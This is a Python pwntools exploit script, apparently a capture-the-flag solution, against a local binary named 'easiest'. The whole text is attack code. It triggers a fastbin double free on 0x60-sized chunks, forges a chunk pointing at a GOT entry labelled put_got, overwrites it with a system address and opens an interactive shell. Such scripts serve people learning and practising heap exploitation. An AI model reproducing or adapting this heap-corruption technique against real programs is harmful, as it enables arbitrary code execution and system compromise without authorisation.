from pwn import *

context.log_level = 'debug'
p = process("./easiest")

put_got = 0x602045
sys_addr = 0x400946
def add(idx,size,content):
	p.recvuntil("2 delete ")
	p.sendline("1")
	p.recvuntil("(0-11):")
	p.sendline(str(idx))
	p.recvuntil("Length:")
	p.sendline(str(size))
	p.recvuntil("C:")
	p.sendline(content)
	
def delete(idx):
	p.recvuntil("2 delete ")
	p.sendline("2")
	p.recvuntil("(0-11):")
	p.sendline(str(idx))

if __name__=='__main__':
	
	add(0,0x60,"a"*0x10)	
	add(1,0x60,"a"*0x10)	
	add(2,0x60,"1"*0x10)	
	add(4,0x100,'p'*0x10)

	delete(2)
	delete(0)
	delete(2)

	add(2,0x60,p64(put_got)+p64(70))
	add(0,0x60,'xxxx')
	add(0,0x60,'xxxx')
	gdb.attach(p)
	add(2,0x60,'xxx'+'x'*0x8+p64(sys_addr))
	p.interactive()
